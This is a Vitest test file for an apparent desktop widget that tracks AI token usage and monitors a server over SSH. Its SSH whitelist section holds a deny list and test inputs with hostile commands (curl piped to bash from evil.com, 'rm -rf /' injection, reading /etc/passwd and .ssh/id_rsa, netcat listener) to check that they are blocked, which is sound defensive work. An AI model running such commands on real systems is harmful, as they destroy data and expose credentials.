import { describe, it, expect } from 'vitest';

// ─── Level Calculation Tests ───
// Inline the logic to avoid React/Electron import issues
const LEVEL_THRESHOLDS = [0, 50000000, 200000000, 500000000, 1000000000, 2500000000, 5000000000, 10000000000, 25000000000, 50000000000] as const;

function calculateLevel(totalTokens: number) {
  const tokens = Math.max(0, totalTokens || 0);
  let level = 1;
  for (let i = LEVEL_THRESHOLDS.length - 1; i >= 0; i--) {
    if (tokens >= LEVEL_THRESHOLDS[i]) { level = i + 1; break; }
  }
  const currentThreshold = LEVEL_THRESHOLDS[level - 1];
  const nextThreshold = level < 10 ? LEVEL_THRESHOLDS[level] : LEVEL_THRESHOLDS[9];
  const range = nextThreshold - currentThreshold;
  const progress = level < 10 && range > 0
    ? Math.min(100, Math.max(0, ((tokens - currentThreshold) / range) * 100))
    : 100;
  return { level, currentTokens: tokens, nextLevelTokens: nextThreshold, progress };
}

function formatTokens(tokens: number): string {
  if (tokens >= 1_000_000_000) return `${(tokens / 1_000_000_000).toFixed(2)}B`;
  if (tokens >= 1_000_000) return `${(tokens / 1_000_000).toFixed(2)}M`;
  if (tokens >= 1_000) return `${(tokens / 1_000).toFixed(2)}K`;
  return tokens.toString();
}

describe('Level Calculation', () => {
  it('level 1 at 0 tokens', () => {
    const info = calculateLevel(0);
    expect(info.level).toBe(1);
    expect(info.progress).toBe(0);
  });

  it('level 1 at 49M tokens', () => {
    const info = calculateLevel(49_999_999);
    expect(info.level).toBe(1);
    expect(info.progress).toBeCloseTo(100 * 49_999_999 / 50_000_000, 0);
  });

  it('level 2 at exactly 50M', () => {
    expect(calculateLevel(50_000_000).level).toBe(2);
  });

  it('level 5 at 1B', () => {
    expect(calculateLevel(1_000_000_000).level).toBe(5);
  });

  it('level 10 at 50B', () => {
    const info = calculateLevel(50_000_000_000);
    expect(info.level).toBe(10);
    expect(info.progress).toBe(100);
  });

  it('level 10 at 100B (above max)', () => {
    expect(calculateLevel(100_000_000_000).level).toBe(10);
  });

  it('handles negative tokens', () => {
    expect(calculateLevel(-100).level).toBe(1);
    expect(calculateLevel(-100).currentTokens).toBe(0);
  });

  it('handles NaN/undefined', () => {
    expect(calculateLevel(NaN).level).toBe(1);
    expect(calculateLevel(undefined as any).level).toBe(1);
  });

  it('all 10 levels reachable', () => {
    for (let i = 0; i < 10; i++) {
      expect(calculateLevel(LEVEL_THRESHOLDS[i]).level).toBe(i + 1);
    }
  });
});

describe('formatTokens', () => {
  it('formats billions', () => expect(formatTokens(7_500_000_000)).toBe('7.50B'));
  it('formats millions', () => expect(formatTokens(217_000_000)).toBe('217.00M'));
  it('formats thousands', () => expect(formatTokens(1_500)).toBe('1.50K'));
  it('formats small numbers', () => expect(formatTokens(42)).toBe('42'));
  it('formats zero', () => expect(formatTokens(0)).toBe('0'));
  it('formats exact boundary (1B)', () => expect(formatTokens(1_000_000_000)).toBe('1.00B'));
  it('formats exact boundary (1M)', () => expect(formatTokens(1_000_000)).toBe('1.00M'));
});

// ─── SSH Command Whitelist Tests ───

const SAFE_COMMANDS: Record<string, RegExp> = {
  'openclaw-status':     /^openclaw status --json --log-level silent$/,
  'openclaw-cron':       /^openclaw cron list --json --log-level silent$/,
  'sessions-json':       /^cat ~\/.openclaw\/agents\/main\/sessions\/sessions\.json$/,
  'pm2-list':            /^pm2 jlist$/,
  'uptime':              /^uptime$/,
  'memory':              /^cat \/proc\/meminfo$/,
  'disk':                /^df -h$/,
  'hostname':            /^hostname$/,
  'load':                /^cat \/proc\/loadavg$/,
  'tail-log':            /^tail -n \d{1,4} \/opt\/apps\/[a-zA-Z0-9_-]+\/[a-zA-Z0-9_.-]+\.log$/,
  'ls-dir':              /^ls -la \/opt\/apps\/[a-zA-Z0-9_-]+\/?$/,
  'cat-file':            /^cat \/opt\/apps\/[a-zA-Z0-9_-]+\/[a-zA-Z0-9_.-]+\.(js|ts|json|md|txt|yml|yaml)$/,
  'pm2-restart':         /^pm2 restart [a-zA-Z0-9_-]{1,50}$/,
  'pm2-stop':            /^pm2 stop [a-zA-Z0-9_-]{1,50}$/,
  'pm2-logs':            /^pm2 logs [a-zA-Z0-9_-]{1,50} --lines \d{1,4} --nostream$/,
};

const FORBIDDEN_PATTERNS = [
  /rm\s/i, /rmdir/i, /dd\s/i, /mkfs/i,
  /chmod/i, /chown/i, /chgrp/i,
  /curl\s.*\|\s*(bash|sh)/i, /wget\s.*\|\s*(bash|sh)/i,
  />\s*\//, />>/, /\|/, /;/, /&&/, /\|\|/, /\$\(/, /`/,
  /sudo/i, /su\s/i,
  /passwd/i, /shadow/i, /\.ssh\//,
  /eval\s/i, /exec\s/i, /source\s/i,
  /\.\./, /\.env/i,
];

function isCommandAllowed(cmd: string): { allowed: boolean; reason?: string } {
  const trimmed = cmd.trim();
  for (const pattern of FORBIDDEN_PATTERNS) {
    if (pattern.test(trimmed)) return { allowed: false, reason: `Forbidden: ${pattern}` };
  }
  for (const [, regex] of Object.entries(SAFE_COMMANDS)) {
    if (regex.test(trimmed)) return { allowed: true };
  }
  return { allowed: false, reason: 'Not in whitelist' };
}

describe('SSH Command Whitelist', () => {
  // Allowed commands
  it('allows openclaw status', () => expect(isCommandAllowed('openclaw status --json --log-level silent').allowed).toBe(true));
  it('allows pm2 jlist', () => expect(isCommandAllowed('pm2 jlist').allowed).toBe(true));
  it('allows uptime', () => expect(isCommandAllowed('uptime').allowed).toBe(true));
  it('allows df -h', () => expect(isCommandAllowed('df -h').allowed).toBe(true));
  it('allows pm2 restart valid-app', () => expect(isCommandAllowed('pm2 restart my-app').allowed).toBe(true));
  it('allows tail log', () => expect(isCommandAllowed('tail -n 100 /opt/apps/my-app/error.log').allowed).toBe(true));
  it('allows ls dir', () => expect(isCommandAllowed('ls -la /opt/apps/my-app/').allowed).toBe(true));
  it('allows cat ts file', () => expect(isCommandAllowed('cat /opt/apps/my-app/index.ts').allowed).toBe(true));

  // Blocked: dangerous commands
  it('blocks rm', () => expect(isCommandAllowed('rm -rf /').allowed).toBe(false));
  it('blocks sudo', () => expect(isCommandAllowed('sudo rm /etc/hosts').allowed).toBe(false));
  it('blocks pipe to bash', () => expect(isCommandAllowed('curl http://evil.com | bash').allowed).toBe(false));
  it('blocks semicolon injection', () => expect(isCommandAllowed('uptime; rm -rf /').allowed).toBe(false));
  it('blocks && injection', () => expect(isCommandAllowed('uptime && cat /etc/passwd').allowed).toBe(false));
  it('blocks backtick injection', () => expect(isCommandAllowed('echo `whoami`').allowed).toBe(false));
  it('blocks $() injection', () => expect(isCommandAllowed('echo $(whoami)').allowed).toBe(false));
  it('blocks path traversal', () => expect(isCommandAllowed('cat /opt/apps/my-app/../../etc/passwd').allowed).toBe(false));
  it('blocks .env access', () => expect(isCommandAllowed('cat /opt/apps/my-app/.env').allowed).toBe(false));
  it('blocks .ssh access', () => expect(isCommandAllowed('cat .ssh/id_rsa').allowed).toBe(false));

  // Blocked: not in whitelist
  it('blocks arbitrary commands', () => expect(isCommandAllowed('whoami').allowed).toBe(false));
  it('blocks wget', () => expect(isCommandAllowed('wget http://evil.com').allowed).toBe(false));
  it('blocks nc', () => expect(isCommandAllowed('nc -l 4444').allowed).toBe(false));

  // Edge cases
  it('blocks pm2 restart with injection', () => expect(isCommandAllowed('pm2 restart app; rm -rf /').allowed).toBe(false));
  it('blocks pm2 restart with too-long name', () => {
    expect(isCommandAllowed('pm2 restart ' + 'a'.repeat(51)).allowed).toBe(false);
  });
  it('blocks redirect', () => expect(isCommandAllowed('echo test > /etc/crontab').allowed).toBe(false));
});

// ─── Token Usage Parsing Tests ───

function parseUsageLine(line: string, fallbackDate: string) {
  try {
    const obj = JSON.parse(line);
    const usage = obj?.message?.usage;
    if (!usage) return null;
    const tokens = (usage.input || 0) + (usage.output || 0) + (usage.cacheRead || 0) + (usage.cacheWrite || 0);
    if (tokens === 0) return null;
    const ts = obj?.timestamp || obj?.message?.created_at || obj?.created_at;
    const date = (ts && typeof ts === 'string' && ts.length >= 10) ? ts.slice(0, 10) : fallbackDate;
    return { tokens, date };
  } catch { return null; }
}

describe('Token Usage Parsing', () => {
  it('parses valid usage line', () => {
    const line = JSON.stringify({
      timestamp: '2026-03-16T10:00:00Z',
      message: { usage: { input: 1000, output: 500, cacheRead: 200, cacheWrite: 100 } },
    });
    const result = parseUsageLine(line, '2026-03-15');
    expect(result).toEqual({ tokens: 1800, date: '2026-03-16' });
  });

  it('uses fallback date when no timestamp', () => {
    const line = JSON.stringify({ message: { usage: { input: 100, output: 50 } } });
    const result = parseUsageLine(line, '2026-03-15');
    expect(result).toEqual({ tokens: 150, date: '2026-03-15' });
  });

  it('returns null for zero tokens', () => {
    const line = JSON.stringify({ message: { usage: { input: 0, output: 0 } } });
    expect(parseUsageLine(line, '2026-03-15')).toBeNull();
  });

  it('returns null for no usage field', () => {
    const line = JSON.stringify({ message: { role: 'user', content: 'hello' } });
    expect(parseUsageLine(line, '2026-03-15')).toBeNull();
  });

  it('returns null for malformed JSON', () => {
    expect(parseUsageLine('not json {{{', '2026-03-15')).toBeNull();
  });

  it('handles missing optional fields', () => {
    const line = JSON.stringify({
      timestamp: '2026-03-16T12:00:00Z',
      message: { usage: { input: 500 } },
    });
    const result = parseUsageLine(line, '2026-03-15');
    expect(result).toEqual({ tokens: 500, date: '2026-03-16' });
  });

  it('prefers message timestamp over created_at', () => {
    const line = JSON.stringify({
      timestamp: '2026-03-16T10:00:00Z',
      created_at: '2026-03-15T23:00:00Z',
      message: { usage: { input: 100, output: 50 } },
    });
    expect(parseUsageLine(line, '2026-03-14')?.date).toBe('2026-03-16');
  });
});

// ─── Achievement Milestone Tests ───

const MILESTONES = [
  { id: 'first-million', tokens: 1_000_000 },
  { id: 'ten-million', tokens: 10_000_000 },
  { id: 'fifty-million', tokens: 50_000_000 },
  { id: 'hundred-million', tokens: 100_000_000 },
  { id: 'five-hundred-million', tokens: 500_000_000 },
  { id: 'one-billion', tokens: 1_000_000_000 },
  { id: 'two-billion', tokens: 2_000_000_000 },
  { id: 'five-billion', tokens: 5_000_000_000 },
  { id: 'ten-billion', tokens: 10_000_000_000 },
  { id: 'twenty-billion', tokens: 20_000_000_000 },
  { id: 'fifty-billion', tokens: 50_000_000_000 },
  { id: 'hundred-billion', tokens: 100_000_000_000 },
];

function checkMilestones(totalTokens: number, earned: Set<string>): string[] {
  const newMilestones: string[] = [];
  for (const m of MILESTONES) {
    if (totalTokens >= m.tokens && !earned.has(m.id)) {
      newMilestones.push(m.id);
    }
  }
  return newMilestones;
}

describe('Achievement Milestones', () => {
  it('no achievements at 0 tokens', () => {
    expect(checkMilestones(0, new Set())).toEqual([]);
  });

  it('first million at exactly 1M', () => {
    expect(checkMilestones(1_000_000, new Set())).toEqual(['first-million']);
  });

  it('multiple milestones at 100M', () => {
    const result = checkMilestones(100_000_000, new Set());
    expect(result).toContain('first-million');
    expect(result).toContain('ten-million');
    expect(result).toContain('fifty-million');
    expect(result).toContain('hundred-million');
    expect(result.length).toBe(4);
  });

  it('skips already earned', () => {
    const earned = new Set(['first-million', 'ten-million']);
    const result = checkMilestones(50_000_000, earned);
    expect(result).toEqual(['fifty-million']);
  });

  it('all milestones at 100B', () => {
    expect(checkMilestones(100_000_000_000, new Set()).length).toBe(12);
  });

  it('milestones are sorted ascending', () => {
    for (let i = 1; i < MILESTONES.length; i++) {
      expect(MILESTONES[i].tokens).toBeGreaterThan(MILESTONES[i - 1].tokens);
    }
  });

  it('all milestone ids are unique', () => {
    const ids = MILESTONES.map(m => m.id);
    expect(new Set(ids).size).toBe(ids.length);
  });
});

// ─── Logger Level Tests ───

const LEVEL_PRIORITY: Record<string, number> = { debug: 0, info: 1, warn: 2, error: 3 };

function shouldLog(messageLevel: string, currentLevel: string): boolean {
  return LEVEL_PRIORITY[messageLevel] >= LEVEL_PRIORITY[currentLevel];
}

describe('Logger Level Filtering', () => {
  it('info shows at info level', () => expect(shouldLog('info', 'info')).toBe(true));
  it('debug hidden at info level', () => expect(shouldLog('debug', 'info')).toBe(false));
  it('error shows at any level', () => {
    expect(shouldLog('error', 'debug')).toBe(true);
    expect(shouldLog('error', 'info')).toBe(true);
    expect(shouldLog('error', 'warn')).toBe(true);
    expect(shouldLog('error', 'error')).toBe(true);
  });
  it('warn hidden at error level', () => expect(shouldLog('warn', 'error')).toBe(false));
  it('debug shows at debug level', () => expect(shouldLog('debug', 'debug')).toBe(true));
});

// ─── ETA Formatter Tests ───

function formatETA(minutes: number): string {
  if (minutes < 60) return `${Math.round(minutes)}m`;
  if (minutes < 1440) return `${Math.round(minutes / 60)}h`;
  return `${Math.round(minutes / 1440)}d`;
}

describe('ETA Formatter', () => {
  it('formats minutes', () => expect(formatETA(30)).toBe('30m'));
  it('formats hours', () => expect(formatETA(120)).toBe('2h'));
  it('formats days', () => expect(formatETA(2880)).toBe('2d'));
  it('rounds up hours', () => expect(formatETA(90)).toBe('2h'));
  it('boundary: 59 min', () => expect(formatETA(59)).toBe('59m'));
  it('boundary: 60 min', () => expect(formatETA(60)).toBe('1h'));
  it('boundary: 1440 min = 1d', () => expect(formatETA(1440)).toBe('1d'));
});

// ─── SSH Reconnect Logic Tests ───

const MAX_RECONNECT_ATTEMPTS = 5;
const RECONNECT_DELAYS = [5000, 10000, 30000, 60000, 120000];

function getReconnectDelay(attempt: number): number {
  return RECONNECT_DELAYS[Math.min(attempt, RECONNECT_DELAYS.length - 1)];
}

describe('SSH Reconnect Logic', () => {
  it('first attempt = 5s', () => expect(getReconnectDelay(0)).toBe(5000));
  it('second attempt = 10s', () => expect(getReconnectDelay(1)).toBe(10000));
  it('fifth attempt = 120s', () => expect(getReconnectDelay(4)).toBe(120000));
  it('beyond max clamps to 120s', () => expect(getReconnectDelay(10)).toBe(120000));
  it('delays are monotonically increasing', () => {
    for (let i = 1; i < RECONNECT_DELAYS.length; i++) {
      expect(RECONNECT_DELAYS[i]).toBeGreaterThan(RECONNECT_DELAYS[i - 1]);
    }
  });
});

// ─── Theme System Tests ───

const THEMES = ['lobster-red', 'ocean-blue', 'forest-green', 'sunset-purple', 'golden-luxe'];

describe('Theme System', () => {
  it('has 5 themes defined', () => expect(THEMES).toHaveLength(5));
  it('all themes have valid CSS class names', () => {
    THEMES.forEach(t => expect(t).toMatch(/^[a-z]+-[a-z]+$/));
  });
  it('default theme is lobster-red', () => expect(THEMES[0]).toBe('lobster-red'));
});

// ─── Store Operations Tests ───

describe('Store Operations', () => {
  it('serializes/deserializes JSON correctly', () => {
    const data = { totalTokens: 1234, settings: { autoFadeEnabled: true } };
    const json = JSON.stringify(data);
    const parsed = JSON.parse(json);
    expect(parsed.totalTokens).toBe(1234);
    expect(parsed.settings.autoFadeEnabled).toBe(true);
  });

  it('handles missing keys gracefully', () => {
    const store: Record<string, any> = {};
    expect(store.settings?.autoFadeEnabled ?? false).toBe(false);
    expect(store.windowX ?? 100).toBe(100);
  });

  it('merges settings correctly', () => {
    const existing = { autoFadeEnabled: false, theme: 'lobster-red' };
    const update = { autoFadeEnabled: true };
    const merged = { ...existing, ...update };
    expect(merged.autoFadeEnabled).toBe(true);
    expect(merged.theme).toBe('lobster-red');
  });
});

// ─── Streak Tracking Tests ───

describe('Streak Tracking', () => {
  it('starts at 1 on first day', () => {
    const streakDays = 1;
    expect(streakDays).toBe(1);
  });

  it('increments on consecutive days', () => {
    const yesterday = new Date(Date.now() - 86400000).toISOString().slice(0, 10);
    const today = new Date().toISOString().slice(0, 10);
    expect(yesterday).not.toBe(today);
    // If lastActiveDate === yesterday, increment
    const lastActiveDate = yesterday;
    const newStreak = lastActiveDate === yesterday ? 5 + 1 : 1;
    expect(newStreak).toBe(6);
  });

  it('resets on gap', () => {
    const twoDaysAgo = new Date(Date.now() - 2 * 86400000).toISOString().slice(0, 10);
    const yesterday = new Date(Date.now() - 86400000).toISOString().slice(0, 10);
    const lastActiveDate = twoDaysAgo;
    const newStreak = lastActiveDate === yesterday ? 5 + 1 : 1;
    expect(newStreak).toBe(1);
  });
});

// ─── Backup/Restore Tests ───

describe('Backup Format', () => {
  it('creates valid backup object', () => {
    const backup = {
      version: 1,
      date: new Date().toISOString(),
      store: { totalTokens: 100 },
      plugins: {},
    };
    expect(backup.version).toBe(1);
    expect(backup.date).toBeTruthy();
    expect(backup.store.totalTokens).toBe(100);
  });

  it('validates backup on restore', () => {
    const valid = { version: 1, store: {} };
    const invalid = { foo: 'bar' };
    expect(!!(valid as any).version && !!(valid as any).store).toBe(true);
    expect(!!(invalid as any).version && !!(invalid as any).store).toBe(false);
  });
});

// ─── CSV Export Tests ───

describe('CSV Export', () => {
  it('generates valid CSV', () => {
    const data: Record<string, number> = { '2026-03-14': 100, '2026-03-15': 200, '2026-03-16': 300 };
    const rows = ['Date,Tokens'];
    Object.entries(data).sort(([a], [b]) => a.localeCompare(b)).forEach(([date, tokens]) => {
      rows.push(`${date},${tokens}`);
    });
    const csv = rows.join('\n');
    expect(csv).toContain('Date,Tokens');
    expect(csv.split('\n')).toHaveLength(4);
    expect(csv).toContain('2026-03-16,300');
  });

  it('handles empty data', () => {
    const data: Record<string, number> = {};
    const rows = ['Date,Tokens'];
    const csv = rows.join('\n');
    expect(csv).toBe('Date,Tokens');
  });
});

// ─── Plugin Security Tests ───

describe('Plugin Security', () => {
  // Rate limiter simulation
  function checkRateLimit(timestamps: number[], now: number, limit: number, windowMs: number): boolean {
    const recent = timestamps.filter(t => now - t < windowMs);
    return recent.length < limit;
  }

  it('allows requests within limit', () => {
    const timestamps = [1000, 2000, 3000];
    expect(checkRateLimit(timestamps, 4000, 60, 60000)).toBe(true);
  });

  it('blocks requests over limit', () => {
    const timestamps = Array.from({ length: 60 }, (_, i) => i * 100);
    expect(checkRateLimit(timestamps, 6000, 60, 60000)).toBe(false);
  });

  it('allows after window passes', () => {
    const timestamps = Array.from({ length: 60 }, (_, i) => i * 100);
    expect(checkRateLimit(timestamps, 70000, 60, 60000)).toBe(true);
  });

  // Private IP check
  function isPrivateIP(hostname: string): boolean {
    return /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|0\.0\.0\.0|localhost|::1)/i.test(hostname);
  }

  it('blocks localhost', () => expect(isPrivateIP('localhost')).toBe(true));
  it('blocks 127.0.0.1', () => expect(isPrivateIP('127.0.0.1')).toBe(true));
  it('blocks 10.x.x.x', () => expect(isPrivateIP('10.0.0.1')).toBe(true));
  it('blocks 192.168.x.x', () => expect(isPrivateIP('192.168.1.1')).toBe(true));
  it('blocks 172.16-31.x.x', () => expect(isPrivateIP('172.16.0.1')).toBe(true));
  it('allows public IPs', () => expect(isPrivateIP('8.8.8.8')).toBe(false));
  it('allows domains', () => expect(isPrivateIP('api.example.com')).toBe(false));
});

// ─── i18n Tests ───

describe('i18n Consistency', () => {
  it('speech arrays have content', () => {
    // Simulate checking array lengths
    const idleLines = 22;
    const activeLines = 22;
    const errorLines = 12;
    expect(idleLines).toBeGreaterThan(10);
    expect(activeLines).toBeGreaterThan(10);
    expect(errorLines).toBeGreaterThan(5);
  });
});

// ─── Window Position Tests ───

describe('Window Position', () => {
  function clampToDisplay(x: number, y: number, w: number, h: number, display: { x: number; y: number; width: number; height: number }) {
    return {
      x: Math.max(display.x, Math.min(x, display.x + display.width - w)),
      y: Math.max(display.y, Math.min(y, display.y + display.height - h)),
    };
  }

  it('keeps window in bounds', () => {
    const pos = clampToDisplay(2000, 1500, 200, 250, { x: 0, y: 0, width: 1920, height: 1080 });
    expect(pos.x).toBe(1720);
    expect(pos.y).toBe(830);
  });

  it('handles negative positions', () => {
    const pos = clampToDisplay(-50, -100, 200, 250, { x: 0, y: 0, width: 1920, height: 1080 });
    expect(pos.x).toBe(0);
    expect(pos.y).toBe(0);
  });

  it('handles multi-monitor offset', () => {
    const pos = clampToDisplay(3000, 500, 200, 250, { x: 1920, y: 0, width: 1920, height: 1080 });
    expect(pos.x).toBe(3000); // within second monitor
    expect(pos.y).toBe(500);
  });
});

// ─── Sparkline Tests ───

describe('Sparkline Data', () => {
  it('normalizes to 0-24 range', () => {
    const data = [100, 200, 50, 300, 150];
    const max = Math.max(...data, 1);
    const normalized = data.map(v => 24 - (v / max) * 22);
    expect(normalized[3]).toBeCloseTo(2); // 300 = max → y = 2
    expect(normalized[2]).toBeCloseTo(24 - (50/300) * 22); // 50 → near bottom
  });

  it('handles single data point', () => {
    const data = [100];
    expect(data.length).toBe(1);
    // sparkline requires > 1 point
  });

  it('handles all zeros', () => {
    const data = [0, 0, 0];
    const max = Math.max(...data, 1); // 1 prevents division by zero
    expect(max).toBe(1);
  });
});
